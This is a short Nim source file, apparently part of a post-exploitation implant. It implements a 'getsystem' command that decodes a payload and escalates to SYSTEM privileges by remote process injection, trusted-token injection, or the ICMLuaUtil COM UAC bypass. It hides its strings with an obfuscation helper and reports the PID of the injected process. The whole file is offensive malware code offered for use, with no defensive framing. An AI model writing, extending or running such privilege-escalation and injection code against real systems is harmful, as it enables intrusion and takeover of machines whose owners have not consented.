import ../../utils/global
import ../execution/core
from ../injection/core import decodePayload
import ./methods
import ./utils

proc run_getsystem*(input, params: string; buf: var openArray[char]): int =
  # Main function that runs getsystem from the chosen method
  let gsMethod = paramGetsystemMethod(params)

  if gsMethod.len == 0:
    return writeErr(obf("getsystem: unknown method (inject, token, com)"), buf)

  let payload = decodePayload(input)
  if payload.len == 0:
    return writeErr(obf("getsystem: invalid input"), buf)

  var ok: bool
  var pid: uint32
  var label: string

  if gsMethod == obf("inject"):
    (ok, pid, label) = getSystemRemoteInject(payload, params)
  elif gsMethod == obf("token"):
    (ok, pid, label) = getSystemTrustedInject(payload, params)
  elif gsMethod == obf("com"):
    (ok, pid, label) = runIcmluaUtilBypass(payload, params)
  else:
    return writeErr(obf("getsystem: unknown method (inject, token, com)"), buf)

  if not ok:
    return writeErr(obf("getsystem: failed"), buf)

  writeMsg(
    obf("getsystem: ok, injected pid ") & $pid & obf(" (") & label & obf(")."),
    buf)
